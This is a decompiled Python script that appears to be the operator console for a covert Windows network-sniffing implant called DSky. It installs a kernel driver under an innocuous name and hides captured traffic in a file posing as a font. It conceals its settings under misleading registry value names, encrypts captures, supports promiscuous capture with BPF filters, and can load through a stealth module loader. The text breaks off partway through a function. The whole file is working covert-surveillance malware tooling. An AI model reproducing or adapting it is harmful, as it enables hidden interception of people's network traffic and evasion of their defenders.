# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: _DarkSkyline.py
import dsz
import dsz.lp
import dsky.menu
import dsz.user
import array
import sys
import xml.dom.minidom
import os
import dsz.windows.driver
try:
    dsz.lp.AddResDirToPath('DeMi')
    import demi
    import demi.registry
    import demi.windows.driver
    bNoDemi = False
except:
    bNoDemi = True

ParamsKey_Name = 'name'
ParamsKey_Action = 'action'
ParamsKey_Method = 'method'
ParamsKey_Quiet = 'quiet'
ParamsKey_Silent = 'silent'
ParamsKey_DriverName = 'DriverName'
ParamsKey_LocalName = 'LocalName'
ParamsKey_Value = 'value'
ParamsKey_Project = 'Project'
ParamsKey_Install = 'Install'
ParamsKey_Connect = 'Connect'
ParamsKey_Disconnect = 'Disconnect'
ParamsKey_Verbose = 'verbose'
ParamsKey_ModuleId = 'ModuleId'
ParamsKey_ModuleOrder = 'ModulerOrder'
ParamsKey_Version = 'Version'
ParamsKey_CaptureFile = 'CaptureFile'
ParamsKey_EncryptionKey = 'EncryptionKey'
ParamsKey_RegistryKey = 'RegistryKey'
KeyName_CaptureFileName = 'FailAction'
KeyName_CaptureFileName_Old = 'ImageFile'
KeyName_MaximumFileSize = 'Backup'
KeyName_MaximumPacketSize = 'Duration'
KeyName_BpfFilter = 'Options'
KeyName_AdapterFilter = 'Tag'
KeyName_EncryptionKey = 'SuccessAction'
g_bAskQuestions = True
g_bSilent = False
g_baseMungeValue = 23602
g_SystemRoot = None
g_SystemSys = None
ADAPTER_FILTER_TYPE_DIRECTED = 1
ADAPTER_FILTER_TYPE_MULTICAST = 2
ADAPTER_FILTER_TYPE_ALL_MULTICAST = 4
ADAPTER_FILTER_TYPE_BROADCAST = 8
ADAPTER_FILTER_TYPE_SOURCE_ROUTING = 16
ADAPTER_FILTER_TYPE_PROMISCUOUS = 32
ADAPTER_FILTER_TYPE_SMT = 64
ADAPTER_FILTER_TYPE_ALL_LOCAL = 128
ADAPTER_FILTER_TYPE_GROUP = 4096
ADAPTER_FILTER_TYPE_ALL_FUNCTIONAL = 8192
ADAPTER_FILTER_TYPE_FUNCTIONAL = 16384
ADAPTER_FILTER_TYPE_MAC_FRAME = 32768
DEFAULT_ADAPTER_FILTER = ADAPTER_FILTER_TYPE_ALL_LOCAL | ADAPTER_FILTER_TYPE_BROADCAST | ADAPTER_FILTER_TYPE_DIRECTED

def main():
    global g_bAskQuestions
    global g_bSilent
    x = dsz.control.Method()
    dsz.control.echo.Off()
    cmdParams = dsz.lp.cmdline.ParseCommandLine(sys.argv, '_DarkSkyline.txt')
    if len(cmdParams) == 0:
        return False
    else:
        try:
            params = dict()
            params[ParamsKey_Project] = 'DSky'
            params[ParamsKey_LocalName] = 'tdi6.sys'
            params[ParamsKey_DriverName] = 'tdi6'
            params[ParamsKey_Version] = GetProjectVersion()
            params[ParamsKey_ModuleOrder] = 1
            params[ParamsKey_CaptureFile] = '\\SystemRoot\\Fonts\\simtrbx.tff'
            params[ParamsKey_Verbose] = False
            params[ParamsKey_Quiet] = False
            params[ParamsKey_Silent] = False
            try:
                randomBytes = os.urandom(16)
                for i in range(0, 16):
                    if i == 0:
                        keyStr = '%02x' % ord(randomBytes[i])
                    else:
                        keyStr = keyStr + ' %02x' % ord(randomBytes[i])

                params[ParamsKey_EncryptionKey] = keyStr
            except:
                Echo('Failed to generate random number from OS -- hashing task id', dsz.WARNING)
                import hashlib
                h = hashlib.new('md5')
                h.update(dsz.script.Env['script_task_id'])
                digest = h.hexdigest()
                keyStr = ''
                for i in range(0, 16):
                    val = int(digest[i * 2:(i + 1) * 2], 16)
                    if i == 0:
                        keyStr = '%02x' % val
                    else:
                        keyStr = keyStr + ' %02x' % val

                params[ParamsKey_EncryptionKey] = keyStr

            try:
                params[ParamsKey_ModuleId] = demi.registry.DSKY.Id
            except:
                mod = demi.registry.ModuleId(259, params[ParamsKey_DriverName], 'DSKY')
                params[ParamsKey_ModuleId] = mod.Id

            if ParamsKey_Name in cmdParams:
                params[ParamsKey_DriverName] = cmdParams[ParamsKey_Name][0]
            if ParamsKey_Method in cmdParams:
                params[ParamsKey_Method] = cmdParams[ParamsKey_Method][0]
            if ParamsKey_Verbose in cmdParams:
                params[ParamsKey_Verbose] = True
            if ParamsKey_Quiet in cmdParams:
                params[ParamsKey_Quiet] = True
                g_bAskQuestions = False
            if ParamsKey_Silent in cmdParams:
                params[ParamsKey_Silent] = True
                g_bSilent = True
            DetermineRegistryKey(params)
            if ParamsKey_Action not in cmdParams:
                menu = dsky.menu.Menu('DSky Control (%s)' % params[ParamsKey_Version])
                menu.SetHeader(dsky.menu.MenuHeader(HeaderFunction, params))
                menu.AddItem(dsky.menu.SectionHeader('Installation Commands'))
                menu.AddItem(dsky.menu.Option('Change driver name', ChangeDriverName, params))
                menu.AddItem(dsky.menu.Option('Install tools', InstallTools, params))
                menu.AddItem(dsky.menu.Option('Uninstall tools', UninstallTools, params))
                menu.AddItem(dsky.menu.Option('Load driver', LoadDriver, params))
                menu.AddItem(dsky.menu.Option('Unload driver', UnloadDriver, params))
                menu.AddItem(dsky.menu.Option('Verify Install', VerifyInstall, params))
                menu.AddItem(dsky.menu.Option('Verify driver is running', VerifyRunning, params))
                menu.AddItem(dsky.menu.SectionHeader('Status Commands'))
                menu.AddItem(dsky.menu.Option('Get current status', CheckDriverStatus, params))
                menu.AddItem(dsky.menu.Option('Get packet filter', GetPacketFilter, params))
                menu.AddItem(dsky.menu.Option('Set packet filter', SetPacketFilter, params))
                menu.AddItem(dsky.menu.Option('Set max capture file size', SetMaximumFileSize, params))
                menu.AddItem(dsky.menu.Option('Set max packet size', SetMaximumPacketSize, params))
                menu.AddItem(dsky.menu.Option('Set capture file name', SetCaptureFileName, params))
                menu.AddItem(dsky.menu.Option('Set encryption key', SetEncryptionKey, params))
                menu.AddItem(dsky.menu.SectionHeader('Control Commands'))
                menu.AddItem(dsky.menu.Option('Start capturing', StartCapturing, params))
                menu.AddItem(dsky.menu.Option('Stop capturing', StopCapturing, params))
                menu.AddItem(dsky.menu.Option('Get capture file', GetCaptureFile, params))
                menu.AddItem(dsky.menu.Option('Delete capture file', DeleteCaptureFile, params))
                if IsKiSuRequested(params):
                    params[ParamsKey_Install] = dsky.menu.Option('Install KiSu', InstallKisu, params)
                    params[ParamsKey_Connect] = dsky.menu.Option('Connect To Kisu', ConnectToKisu, params)
                    params[ParamsKey_Disconnect] = dsky.menu.Option('Disconnect From Kisu', DisconnectFromKisu, params)
                    params[ParamsKey_Install].SetShown(not demi.IsConnected())
                    params[ParamsKey_Connect].SetShown(not demi.IsConnected())
                    params[ParamsKey_Disconnect].SetShown(demi.IsConnected())
                    menu.AddItem(dsky.menu.SectionHeader('KiSu Commands'))
                    menu.AddItem(params[ParamsKey_Install])
                    menu.AddItem(params[ParamsKey_Connect])
                    menu.AddItem(params[ParamsKey_Disconnect])
                menu.ExecuteUntilQuit()
                return True
            actions = dict()
            actions['install'] = InstallTools
            actions['uninstall'] = UninstallTools
            actions['upgrade'] = UpgradeTools
            actions['verifyinstall'] = VerifyInstall
            actions['verifyrunning'] = VerifyRunning
            actions['load'] = LoadDriver
            actions['unload'] = UnloadDriver
            actions['status'] = CheckDriverStatus
            actions['getfilter'] = GetPacketFilter
            actions['setfilter'] = SetPacketFilter
            actions['setmaxsize'] = SetMaximumFileSize
            actions['setpacketsize'] = SetMaximumPacketSize
            actions['setcapturefile'] = SetCaptureFileName
            actions['setkey'] = SetEncryptionKey
            actions['start'] = StartCapturing
            actions['stop'] = StopCapturing
            actions['getcapture'] = GetCaptureFile
            actions['deletecapture'] = DeleteCaptureFile
            action = cmdParams[ParamsKey_Action][0].lower()
            val = None
            if ParamsKey_Value in cmdParams:
                val = cmdParams[ParamsKey_Value]
            if action in actions:
                return actions[action](params, val)
            Echo("'%s' is an unhandled action" % action)
            return False
        except RuntimeError as err:
            Echo('%s' % err, dsz.ERROR)
            return False

        return True


def DetermineRegistryKey(params):
    Echo('Determining registry key')
    if IsKiSuEnabled(params):
        try:
            dsz.cmd.Run('kisu_config', dsz.RUN_FLAG_RECORD)
            location = dsz.cmd.data.Get('Configuration::KernelModuleLoader::RegistryKey', dsz.TYPE_STRING)[0]
            prefix = '\\registry\\machine\\'
            if location.startswith(prefix):
                location = location[len(prefix):]
            params[ParamsKey_RegistryKey] = location
            Echo('    SUCCESS (%s)' % params[ParamsKey_RegistryKey], dsz.GOOD)
        except Exception as e:
            Echo('    FAILED (%s)' % e, dsz.ERROR)

    else:
        params[ParamsKey_RegistryKey] = 'SYSTEM\\CurrentControlSet\\Services'
        Echo('    SUCCESS (%s)' % params[ParamsKey_RegistryKey], dsz.GOOD)


def InstallKisu(params, value=None):
    print dir(demi)
    return demi.InstallKiSu()


def ConnectToKisu(params, value=None):
    if demi.ConnectKiSu():
        params[ParamsKey_Install].SetShown(False)
        params[ParamsKey_Connect].SetShown(False)
        params[ParamsKey_Disconnect].SetShown(True)
        DetermineRegistryKey(params)
        return True
    else:
        return False


def DisconnectFromKisu(params, value=None):
    if demi.DisconnectKiSu():
        params[ParamsKey_Install].SetShown(True)
        params[ParamsKey_Connect].SetShown(True)
        params[ParamsKey_Disconnect].SetShown(False)
        DetermineRegistryKey(params)
        return True
    else:
        return False


def HeaderFunction(params, value=None):
    if IsKiSuEnabled(params):
        useKisu = 'True'
        useKisuType = dsz.GOOD
    else:
        useKisu = 'False'
        useKisuType = dsz.WARNING
    Echo('Current Configuration:')
    Echo('        Driver Name : %s' % params[ParamsKey_DriverName])
    Echo('       Capture File : %s' % params[ParamsKey_CaptureFile])
    Echo(' Capture File Win32 : %s' % _convertFileNameToWin32(params[ParamsKey_CaptureFile]))
    Echo('     Encryption Key : %s' % params[ParamsKey_EncryptionKey])
    Echo('  Use DecibelMinute : %s' % useKisu, useKisuType)
    if useKisu:
        if demi.IsConnected():
            id = demi.ConnectedId()
            Echo('          Connected : True', dsz.GOOD)
            Echo('       Connected To : 0x%08x - %s' % (id, demi.TranslateIdToName(id)))
        else:
            Echo('          Connected : False', dsz.ERROR)
    return None


def GetProjectVersion():
    try:
        resDir = dsz.lp.GetResourcesDirectory()
        xmlFile = '%s/DSky/Version/DSky_Version.xml' % resDir
        doc = xml.dom.minidom.parse(xmlFile)
        verNode = doc.getElementsByTagName('Version').item(0)
        verStr = ''
        for n in verNode.childNodes:
            if n.nodeType == xml.dom.Node.TEXT_NODE:
                verStr = '%s%s' % (verStr, n.data)

        return verStr
    except:
        raise
        return 'DSky 0.0.0.0'


def ChangeDriverName(params, value=None):
    Echo("Current driver name : '%s'" % params[ParamsKey_DriverName])
    params[ParamsKey_DriverName] = dsz.ui.GetString('Enter new driver name')
    return params[ParamsKey_DriverName]


def InstallTools(params, value=None, bAskParam=None):
    if bAskParam == None:
        bAsk = g_bAskQuestions
    else:
        bAsk = bAskParam
    if not AddDriver(params, bAsk):
        dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Installed', 'Failed')
        return False
    else:
        if IsKiSuEnabled(params):
            Echo('Loading DSky (must be done before configuration)', dsz.WARNING)
            LoadDriver(params)
        SetCaptureFileName(params)
        SetMaximumFileSize(params)
        SetEncryptionKey(params)
        dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Installed', 'Successful')
        return True


def AddDriver(params, value=None, bAskParam=None):
    if bAskParam == None:
        bAsk = g_bAskQuestions
    else:
        bAsk = bAskParam
    if IsKiSuEnabled(params):
        bRet = demi.windows.driver.Install(params[ParamsKey_Project], params[ParamsKey_DriverName], params[ParamsKey_LocalName], 2, 1, params[ParamsKey_ModuleId], params[ParamsKey_ModuleOrder], bAsk)
    else:
        bRet = dsz.windows.driver.Install(params[ParamsKey_Project], params[ParamsKey_DriverName], params[ParamsKey_LocalName], 2, 1, bAsk)
    if bRet:
        dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Installed', 'Successful')
    else:
        dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Installed', 'Failed')
    return bRet


def UninstallTools(params, value=None, bAskParam=None):
    if bAskParam == None:
        bAsk = g_bAskQuestions
    else:
        bAsk = bAskParam
    if IsKiSuEnabled(params):
        dsz.cmd.Run('registrydelete -key "%s\\%s" -value "%s" -hive L' % (params[ParamsKey_RegistryKey], params[ParamsKey_DriverName], KeyName_CaptureFileName))
        dsz.cmd.Run('registrydelete -key "%s\\%s" -value "%s" -hive L' % (params[ParamsKey_RegistryKey], params[ParamsKey_DriverName], KeyName_CaptureFileName_Old))
        dsz.cmd.Run('registrydelete -key "%s\\%s" -value "%s" -hive L' % (params[ParamsKey_RegistryKey], params[ParamsKey_DriverName], KeyName_MaximumFileSize))
        dsz.cmd.Run('registrydelete -key "%s\\%s" -value "%s" -hive L' % (params[ParamsKey_RegistryKey], params[ParamsKey_DriverName], KeyName_MaximumPacketSize))
        dsz.cmd.Run('registrydelete -key "%s\\%s" -value "%s" -hive L' % (params[ParamsKey_RegistryKey], params[ParamsKey_DriverName], KeyName_BpfFilter))
        dsz.cmd.Run('registrydelete -key "%s\\%s" -value "%s" -hive L' % (params[ParamsKey_RegistryKey], params[ParamsKey_DriverName], KeyName_AdapterFilter))
        dsz.cmd.Run('registrydelete -key "%s\\%s" -value "%s" -hive L' % (params[ParamsKey_RegistryKey], params[ParamsKey_DriverName], KeyName_EncryptionKey))
        bRet = demi.windows.driver.Uninstall(params[ParamsKey_Project], params[ParamsKey_DriverName], params[ParamsKey_ModuleId], bAsk)
    else:
        bRet = dsz.windows.driver.Uninstall(params[ParamsKey_Project], params[ParamsKey_DriverName], bAsk)
    if bRet:
        dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Uninstalled', 'Successful')
    else:
        dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Uninstalled', 'Failed')
    return bRet


def UpgradeTools(params, value=None, bAskParam=None):
    if bAskParam == None:
        bAsk = g_bAskQuestions
    else:
        bAsk = bAskParam
    if bAsk and not dsz.ui.Prompt('Do you want to upgrade the %s driver (%s.sys)?' % (params[ParamsKey_Project], params[ParamsKey_DriverName])):
        dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Upgrade', 'Cancelled')
        return False
    else:
        bRet = True
        if not UninstallTools(params, False):
            bRet = False
        if not InstallTools(params, False):
            bRet = False
        if not LoadDriver(params):
            bRet = False
        if not bRet:
            Echo('Parts of the upgrade failed')
            VerifyInstall(params)
            VerifyRunning(params)
        if bRet:
            dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Upgrade', 'Successful')
        else:
            dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Upgrade', 'Failed')
        return bRet


def LoadDriver(params, value=None, bAskParam=None):
    if bAskParam == None:
        bAsk = g_bAskQuestions
    else:
        bAsk = bAskParam
    if IsKiSuEnabled(params):
        bRet = demi.windows.driver.Load(params[ParamsKey_DriverName], params[ParamsKey_ModuleId])
    else:
        bRet = dsz.windows.driver.Load(params[ParamsKey_DriverName])
    if bRet:
        dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Load Driver', 'Successful')
    else:
        dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Load Driver', 'Failed')
    return bRet


def UnloadDriver(params, value=None, bAskParam=None):
    if bAskParam == None:
        bAsk = g_bAskQuestions
    else:
        bAsk = bAskParam
    if IsKiSuEnabled(params):
        bRet = demi.windows.driver.Unload(params[ParamsKey_DriverName], params[ParamsKey_ModuleId])
    else:
        bRet = dsz.windows.driver.Unload(params[ParamsKey_DriverName])
    if bRet:
        dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Unload Driver', 'Successful')
    else:
        dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Unload Driver', 'Failed')
    return bRet


def VerifyInstall(params, value=None, bAskParam=None):
    if bAskParam == None:
        bAsk = g_bAskQuestions
    else:
        bAsk = bAskParam
    if IsKiSuEnabled(params):
        bRet = demi.windows.driver.VerifyInstall(params[ParamsKey_DriverName], params[ParamsKey_ModuleId], 2, 1)
    else:
        bRet = dsz.windows.driver.VerifyInstall(params[ParamsKey_DriverName], 2, 1)
    if bRet:
        dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Verify Install', 'Successful')
    else:
        dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Verify Install', 'Failed')
    return bRet


def VerifyRunning(params, value=None, bAskParam=None):
    if bAskParam == None:
        bAsk = g_bAskQuestions
    else:
        bAsk = bAskParam
    x = dsz.control.Method()
    dsz.control.echo.Off()
    if IsKiSuEnabled(params):
        demi.windows.driver.VerifyRunning(params[ParamsKey_DriverName], params[ParamsKey_ModuleId])
        Echo('Checking for presence of DSKY via control plugin')
        if IsDskyRunning(params):
            Echo('    SUCCESS', dsz.GOOD)
            bRet = True
        else:
            Echo('    FAILURE', dsz.ERROR)
            bRet = False
    else:
        bRet = dsz.windows.driver.VerifyRunning(params[ParamsKey_DriverName])
    if bRet:
        dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Verify Running', 'Successful')
    else:
        dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Verify Running', 'Failed')
    return bRet


def CheckDriverStatus(params, value=None, bAskParam=None):
    if bAskParam == None:
        bAsk = g_bAskQuestions
    else:
        bAsk = bAskParam
    x = dsz.control.Method()
    dsz.control.echo.Off()
    dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Check Driver Status')
    dsz.script.data.Start('DSkyStatus')
    bSuccess = True
    captureFile = ''
    if not dsz.cmd.Run('trafficcapture -status -name %s' % params[ParamsKey_DriverName], dsz.RUN_FLAG_RECORD):
        Echo('\n**** UNABLE TO GET DRIVER STATUS ****', dsz.ERROR)
        bSuccess = False
    else:
        try:
            status = dsz.cmd.data.Get('status', dsz.TYPE_OBJECT)[0]
            major = dsz.cmd.data.ObjectGet(status, 'VersionMajor', dsz.TYPE_INT)[0]
            minor = dsz.cmd.data.ObjectGet(status, 'VersionMinor', dsz.TYPE_INT)[0]
            fix = dsz.cmd.data.ObjectGet(status, 'VersionRevision', dsz.TYPE_INT)[0]
            if dsz.cmd.data.ObjectGet(status, 'FilterActive', dsz.TYPE_BOOL)[0]:
                packetScanning = 'ENABLED'
                packetScanningType = dsz.GOOD
            else:
                packetScanning = 'DISABLED'
                packetScanningType = dsz.WARNING
            if dsz.cmd.data.ObjectGet(status, 'ThreadRunning', dsz.TYPE_BOOL)[0]:
                threadRunning = 'YES'
                threadRunningType = dsz.GOOD
            else:
                threadRunning = 'NO'
                threadRunningType = dsz.WARNING
            maxFileSize = dsz.cmd.data.ObjectGet(status, 'MaxFileSize', dsz.TYPE_INT)[0]
            if maxFileSize == 0:
                maxFileSizeText = 'UNLIMITED'
                maxFileSizeTextType = dsz.DEFAULT
            else:
                maxFileSizeText = '%d' % maxFileSize
                maxFileSizeTextType = dsz.DEFAULT
            maxPacketSize = dsz.cmd.data.ObjectGet(status, 'MaxPacketSize', dsz.TYPE_INT)[0]
            if maxPacketSize == 0:
                maxPacketSizeText = 'UNLIMITED'
                maxPacketSizeTextType = dsz.DEFAULT
            else:
                maxPacketSizeText = '%d' % maxPacketSize
                maxPacketSizeTextType = dsz.DEFAULT
            captureFile = dsz.cmd.data.ObjectGet(status, 'CaptureFile', dsz.TYPE_STRING)[0]
            captureFileSize = dsz.cmd.data.ObjectGet(status, 'CaptureFileSize', dsz.TYPE_INT)[0]
            if maxFileSize > 0 and captureFileSize * 2 >= maxFileSize:
                captureFileSizeType = dsz.WARNING
            else:
                captureFileSizeType = dsz.DEFAULT
            encryptKey = dsz.cmd.data.ObjectGet(status, 'EncryptionKey', dsz.TYPE_STRING)[0]
            for item, type in [('VersionMajor', dsz.TYPE_INT),
             (
              'VersionMinor', dsz.TYPE_INT),
             (
              'VersionRevision', dsz.TYPE_INT),
             (
              'FilterActive', dsz.TYPE_BOOL),
             (
              'ThreadRunning', dsz.TYPE_BOOL),
             (
              'MaxFileSize', dsz.TYPE_INT),
             (
              'MaxPacketSize', dsz.TYPE_INT),
             (
              'CaptureFile', dsz.TYPE_STRING),
             (
              'CaptureFileSize', dsz.TYPE_INT),
             (
              'EncryptionKey', dsz.TYPE_STRING)]:
                dsz.script.data.Add(item, '%s' % dsz.cmd.data.ObjectGet(status, item, type)[0], type)

            Echo('            Version : %d.%d.%d' % (major, minor, fix))
            Echo('    Packet Scanning : %s' % packetScanning, packetScanningType)
            Echo('     Thread Running : %s' % threadRunning, threadRunningType)
            Echo('      Max File Size : %s' % maxFileSizeText, maxFileSizeTextType)
            Echo('                      (0x%x)' % maxFileSize, maxFileSizeTextType)
            Echo('    Max Packet Size : %s' % maxPacketSizeText, maxPacketSizeTextType)
            Echo('                      (0x%x)' % maxPacketSize, maxPacketSizeTextType)
            Echo('       Capture File : %s' % captureFile)
            Echo('  Capture File Size : %d' % captureFileSize, captureFileSizeType)
            Echo('     Encryption Key : %s' % encryptKey)
            Echo('       Registry Key : %s\\%s' % (params[ParamsKey_RegistryKey], params[ParamsKey_DriverName]))
            params[ParamsKey_CaptureFile] = captureFile
            try:
                keyStr = ''
                for i in range(0, 16):
                    val = int(encryptKey[i * 2:(i + 1) * 2], 16)
                    if len(keyStr) > 0:
                        keyStr = keyStr + ' '
                    keyStr = keyStr + '%02x' % val

                params[ParamsKey_EncryptionKey] = keyStr
            except:
                pass

        except Exception as e:
            Echo('\n**** UNABLE TO GET DRIVER VERSION****', dsz.ERROR)
            Echo('%s' % e)
            bSuccess = False

    if len(captureFile) == 0:
        captureFile = getFileNameFromRegistry(params)
    fileSizeText = 'NOT FOUND'
    if dsz.cmd.Run('dir "%s"' % _convertFileNameToWin32(captureFile), dsz.RUN_FLAG_RECORD):
        try:
            fileSize = dsz.cmd.data.Get('DirItem::FileItem::Size', dsz.TYPE_INT)[0]
            fileSizeText = '%d bytes' % fileSize
            dsz.script.data.Add('DiskFileSize', fileSize, dsz.TYPE_INT)
        except Exception as e:
            pass

    Echo("Dir of Capture File : '%s' (%s)" % (_convertFileNameToWin32(captureFile), fileSizeText))
    dsz.script.data.Store()
    return bSuccess


def GetPacketFilter(params, value=None, bAskParam=None, bQuiet=False):
    if bAskParam == None:
        bAsk = g_bAskQuestions
    else:
        bAsk = bAskParam
    x = dsz.control.Method()
    if not bQuiet:
        dsz.control.echo.On()
    bRet = dsz.cmd.Run('trafficcapture -name %s -get' % params[ParamsKey_DriverName], dsz.RUN_FLAG_RECORD)
    if bRet:
        dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Get Packet Filter', 'Successful')
    else:
        dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Get Packet Filter', 'Failed')
    return bRet


def SetPacketFilter(params, value=None, bAskParam=None):
    x = dsz.control.Method()
    dsz.control.echo.Off()
    if bAskParam == None:
        bAsk = g_bAskQuestions
    else:
        bAsk = bAskParam
    if not IsDskyRunning(params) and IsKiSuRequested(params):
        Echo('* You must load the driver before you can configure it (KiSu requirement)', dsz.ERROR)
        return False
    else:
        if value:
            if len(value) > 2:
                Echo('* <Filename> [Promiscious] required', dsz.ERROR)
                return False
            bpfFile = value[0]
            if len(value) == 2:
                promisc = '-promiscuous'
            else:
                promisc = ''
        else:
            try:
                import glob
                import re
                resourceDir = dsz.env.Get('_LPDIR_RESOURCES')
                menu = dsky.menu.Menu('DSky Control (%s)' % params[ParamsKey_Version])
                menu.AddItem(dsky.menu.Option('Select filter manually', dsz.ui.GetString, 'Enter the filter file'))
                menu.AddItem(dsky.menu.Option('Compile a new BPF filter', CompileBpfFile))
                filterDir = '%s/DSky/Filters' % resourceDir
                for bpfFile in os.listdir(filterDir):
                    if not re.search('.*.filt', bpfFile):
                        continue
                    menu.AddItem(dsky.menu.Option(bpfFile, lambda filename: filename, '%s/%s' % (filterDir, bpfFile)))

                filterDir = '%s' % ('%s/CompiledBpf/' % dsz.script.Env['target_address'])
                for bpfFile in glob.glob('%s/*.filt' % filterDir):
                    if not re.search('.*.filt', bpfFile):
                        continue
                    menu.AddItem(dsky.menu.Option(bpfFile, lambda filename: filename, '%s/%s' % (filterDir, bpfFile)))

                bpfFile = menu.Execute()
                if bpfFile == None:
                    dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Set Packet Filter', 'Cancelled')
                    return True
                if dsz.ui.Prompt('Do you want to listen in promiscuous mode?', False):
                    promisc = '-promiscuous'
                else:
                    promisc = ''
            except Exception as e:
                Echo('Exception %s' % e, dsz.ERROR)
                dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Set Packet Filter', 'Failed')
                return False

        Echo('Verifying Filter')
        if dsz.cmd.Run('trafficcapture -name %s -validate %s %s' % (params[ParamsKey_DriverName], bpfFile, promisc)):
            Echo('    SUCCESS', dsz.GOOD)
            dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Verify Packet Filter', 'Successful')
        else:
            Echo('    FAILED', dsz.ERROR)
            dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Verify Packet Filter', 'Failed')
            return False
        Echo('Setting BPF Filter')
        try:
            if bpfFile.startswith('"') and bpfFile.endswith('"'):
                bpfFile = bpfFile[1:len(bpfFile) - 1]
            filterBytes = array.array('B')
            f = open(bpfFile, 'rb')
            try:
                filterBytes.fromfile(f, os.path.getsize(bpfFile))
            finally:
                f.close()

            filterBytesStr = ''
            for b in filterBytes:
                if len(filterBytesStr) > 0:
                    filterBytesStr = filterBytesStr + ' '
                filterBytesStr = filterBytesStr + '%02x' % b

            dsz.windows.registry.SetValue('L', '%s\\%s' % (params[ParamsKey_RegistryKey], params[ParamsKey_DriverName]), KeyName_BpfFilter, filterBytesStr, 'REG_BINARY')
            Echo('    SUCCESS', dsz.GOOD)
            dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Set BPF Filter', 'Successful')
        except Exception as e:
            Echo('    FAILED (%s)' % e, dsz.ERROR)
            dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Set BPF Filter', 'Failed')
            return False

        Echo('Setting Adapter Filter')
        adapterFilter = DEFAULT_ADAPTER_FILTER
        if len(promisc) > 0:
            adapterFilter |= ADAPTER_FILTER_TYPE_PROMISCUOUS
        try:
            dsz.windows.registry.SetValue('L', '%s\\%s' % (params[ParamsKey_RegistryKey], params[ParamsKey_DriverName]), KeyName_AdapterFilter, adapterFilter, 'REG_DWORD')
            Echo('    SUCCESS', dsz.GOOD)
            dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Set Adapter Filter', 'Successful')
        except:
            Echo('    FAILED', dsz.ERROR)
            dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Set Adapter Filter', 'Failed')
            return False

        return True


def SetMaximumPacketSize(params, value=None, bAskParam=None):
    if bAskParam == None:
        bAsk = g_bAskQuestions
    else:
        bAsk = bAskParam
    x = dsz.control.Method()
    dsz.control.echo.Off()
    if not IsDskyRunning(params) and IsKiSuRequested(params):
        Echo('* You must load the driver before you can configure it (KiSu requirement)', dsz.ERROR)
        return False
    else:
        if value:
            if len(value) == 1:
                size = int(value[0])
            else:
                Echo('* <size>', dsz.ERROR)
                return False
        else:
            currentValue = 0
            try:
                currentValue = dsz.windows.registry.GetValue('L', '%s\\%s' % (params[ParamsKey_RegistryKey], params[ParamsKey_DriverName]), KeyName_MaximumPacketSize)[0]
            except:
                currentValue = None

            Echo('')
            Echo('Enter a size of zero for an unlimited packet size')
            Echo('')
            if currentValue != None:
                size = dsz.ui.GetInt('Enter the maximum packet size (in bytes)', currentValue)
            else:
                size = dsz.ui.GetInt('Enter the maximum packet size (in bytes)')
        Echo('Setting maximum file size')
        try:
            dsz.windows.registry.SetValue('L', '%s\\%s' % (params[ParamsKey_RegistryKey], params[ParamsKey_DriverName]), KeyName_MaximumPacketSize, size, 'REG_DWORD')
            Echo('    SUCCESS', dsz.GOOD)
            dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Set Maximum Packet Size', 'Successful')
            return True
        except:
            Echo('    FAILED', dsz.ERROR)
            dsz.lp.RecordToolUse(params[ParamsKey_Project], params[ParamsKey_Version], 'Set Maximum Packet Size', 'Failed')
            return False

        return


def CompileBpfFile(param):
    srcFile = dsz.ui.GetString('Please enter the location of the BPF filter you would like to compile')
    bpfCompiler = '%s/DSky/Tools/%s-%s/BpfCompiler.exe' % (dsz.lp.GetResourcesDirectory(), 'i386', 'winnt')
    dstFileName = 'filter_%s.filt' % dsz.Timestamp()
    dstDir = '%s/CompiledBpf/' % dsz.lp.GetLogsDirectory()
    try:
        os.mkdir(dstDir)
    except:
        pass

    cmd = 'local run -command "\\"%s\\" -i \\"%s\\" -o \\"%s/%s\\"" -redirect' % (bpfCompiler, srcFile, dstDir, dstFileName)
    if dsz.cmd.Run(cmd):
        return '%s/%s' % (dstDir, dstFileName)
    else:
        return None


def SetMaximumFileSize(params, value=None, bAskParam=None):
    if bAskParam == None:
        bAsk = g_bAskQuestions
    else:
        bAsk = bAskParam
    x = dsz.control.Method()
    dsz.control.echo.Off()
    if not IsDskyRunning(params) and IsKiSuRequested(params):
